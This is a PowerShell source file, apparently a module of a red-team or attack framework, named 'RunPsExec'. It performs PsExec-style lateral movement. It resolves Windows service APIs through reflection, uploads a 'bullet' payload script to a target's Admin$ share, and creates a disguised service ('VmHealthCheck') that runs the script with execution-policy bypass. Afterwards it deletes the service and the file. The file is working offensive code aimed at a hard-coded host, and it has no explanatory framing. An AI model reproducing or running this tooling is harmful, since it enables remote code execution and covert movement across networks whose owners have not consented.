    }
    $result
  }

  function Local:Get-DelegateType {
    Param (
        [OutputType([Type])]
        [Parameter( Position = 0)] [Type[]] $Parameters = (New-Object Type[](0)),
        [Parameter( Position = 1 )] [Type] $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
      
    Write-Output $TypeBuilder.CreateType()
  }

  function Local:Get-ProcAddress {
    Param (
      [OutputType([IntPtr])]
      [Parameter( Position = 0, Mandatory = $True )] [String] $Module,
      [Parameter( Position = 1, Mandatory = $True )] [String] $Procedure
    )

    # Get a reference to System.dll in the GAC
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
      Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    #$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
    # Get a handle to the module specified
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
      
    # Return the address of the function
    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
  }

  function Local:Invoke-PsExecCmd {
    param (
      [string] $ComputerName,
      [string] $RemoteBulletFile,
      [string] $ServiceName,
      [switch] $NoCleanup
    )
    $remoteCmd = 
      '%SYSTEMROOT%\\system32\\cmd.exe /c start ' +
      '%SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noni -nop -exe bypass -f ' +
      $RemoteBulletFile
    
    #region Declare/setup all the needed API function
    $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle
    $CloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])
    $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)    

    $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA
    $OpenSCManagerADelegate = Get-DelegateType @( [string], [string], [Int]) ([IntPtr])
    $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)
    
    $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA
    $OpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([Int])
    $OpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)

    $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA
    $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [string], [string], [Int], [Int], [Int], [Int], [string], [string], [Int], [Int], [Int], [Int]) ([IntPtr])
    $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)

    $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA
    $StartServiceADelegate = Get-DelegateType @( [IntPtr], [Int], [Int]) ([Int])
    $StartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StartServiceAAddr, $StartServiceADelegate)

    $DeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService
    $DeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([Int])
    $DeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DeleteServiceAddr, $DeleteServiceDelegate)

    $GetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError
    $GetLastErrorDelegate = Get-DelegateType @() ([Int])
    $GetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetLastErrorAddr, $GetLastErrorDelegate)
    #endregion

    #region Service manipulation
    Out-Info '[+] #1. OpenSCManager. Opening service manager'
    $ManagerHandle = $OpenSCManagerA.Invoke("\\$ComputerName", "ServicesActive", 0xF003F)
    if (-not $ManagerHandle) {
      $lastErr = $GetLastError.Invoke()
      Out-Info "[!] #1. OpenSCManager. Operation failed, LastError: $$lastErr"
      throw "GetLastError returned $lastErr"
    }

    Out-Info "[+] #2. CreateServiceA. Creating new service: '$ServiceName'"
    $ServiceHandle = $CreateServiceA.Invoke($ManagerHandle, $ServiceName, $ServiceName, 0xF003F, 0x10, 0x3, 0x1, `
      $remoteCmd, $null, $null, $null, $null, $null)
    if (-not $ServiceHandle) {
      $lastErr = $GetLastError.Invoke()
      Out-Info "[!] #2. CreateService failed, LastError: $lastErr"
      throw "GetLastError returned $lastErr"
    } 

    Out-Info "[+] #3. StartService. Starting the service"
    $val = $StartServiceA.Invoke($ServiceHandle, $null, $null)
    Start-Sleep -s 3  # lets breathe for a second
    $lastErr = $GetLastError.Invoke()
    if ($val -ne 0){
      Out-Debug "[*] #3. StartService. Service successfully started"
    }
    else{
      if ($lastErr -eq 0){
        Out-Debug "[*] #3. StartService. Command returned '0'. Looks like everything is Ok"
      } elseif ($lastErr -eq 1053){
        Out-Debug "[*] #3. StartService. Command didn't respond to start. It's Ok, normal behaviour"
      } else{
        Out-Info "[!] #3. StartService. StartService failed, LastError: $lastErr"
      }
    }

    Out-Info "[+] #4. DeleteService. Deleting the service '$ServiceName' after small pause"
    Start-Sleep -s 15  # lets breathe for a bit
    $val = $DeleteService.invoke($ServiceHandle)
    if ($val -eq 0){
      $lastErr = $GetLastError.Invoke()
      Out-Info "[!] #4. DeleteService. DeleteService failed, LastError: $lastErr"
    } else{
      Out-Debug "[*] #4. DeleteService. Service successfully deleted"
    }
    
    Out-Info "[+] #5. CloseServiceHandle. Closing the Service handle"
    $val = $CloseServiceHandle.Invoke($ServiceHandle)

    Out-Info "[+] #6. CloseServiceHandle. Closing the SC Manager handle"
    $null = $CloseServiceHandle.Invoke($ManagerHandle)
  #endregion
  #Invoke-PsExecCmd
}  


  #region Invoke-PsExec code
  try {
    $remoteBulletFile = [System.IO.Path]::GetRandomFileName() + '.ps1'
    $RemoteUploadPath = "\\$ComputerName\Admin$\$remoteBulletFile"
    Out-Info "[*] Copying bullet file $BulletFile to '$RemoteUploadPath'"
    Copy-Item -Force -Path $BulletFile -Destination $RemoteUploadPath
  } catch {
    throw "[!] Can not upload bullet file $BulletFile to remote share $RemoteUploadPath`n$($error[0])"
  }
  
  Invoke-PsExecCmd -ComputerName $ComputerName -RemoteBulletFile $RemoteUploadPath -ServiceName $ServiceName

  try {
    Out-Info "[*] Removing the remote bullet file '$RemoteUploadPath'"
    Remove-Item -Path $RemoteUploadPath -Force
  } catch {}
  #endregion


function Start-Module {
  Param (
    [String] $TargetHost = '',
    [string] $ServiceName = "VmHealthCheck",
    [String] $LogFile = '',
    [Switch] $Debug
  )

  $script:moduleLogFile = $LogFile
  $script:moduleDebug = $Debug
  Out-Info (Get-PlatformInfo)
  Out-Debug "[+] Start module with params: TargetHost: '$TargetHost'  ServiceName: '$ServiceName'"

  try {
    if (-not ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain)) {
        throw "[!] Current host $($env:COMPUTERNAME) is not a member of domain and can't be used for LDAP search. Execution aborted"
    }
    if ([string]::IsNullOrEmpty($TargetHost)) {
      throw "[!] Target computer name is empty. Execution aborted"
    }
  
    $SavePath = $env:PUBLIC
    $LocalBulletFile = Save-Bullet $SavePath
    $cbBullet = (Get-Item $LocalBulletFile).length
    Out-Debug "[+] Bullet unpacked to '$LocalBulletFile'. Code length = $cbBullet"
    $ServiceName = $ServiceName + (Get-Random -Maximum 10000).ToString()
    Invoke-PsExec -ComputerName $TargetHost -BulletFile "$LocalBulletFile" -ServiceName $ServiceName
  } 
  catch {
    Out-Info "Module error:"
    Out-Info $error[0].Message
    Out-Debug $error[0].InvocationInfo.PositionMessage 
  }
  finally {
    Clear-Bullet $LocalBulletFile
  }
}

# -- module startup ----------------------------------------
$ModVer = "Module: RunPsExec v.0.1(Pause)"
$script:moduleLogFile = ''
$script:moduleDebug = $false
$global:ProgressPreference = "SilentlyContinue"
$script:SessionUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name

Start-Module -TargetHost "ALISOPCLD"   
Out-Info "Module complete"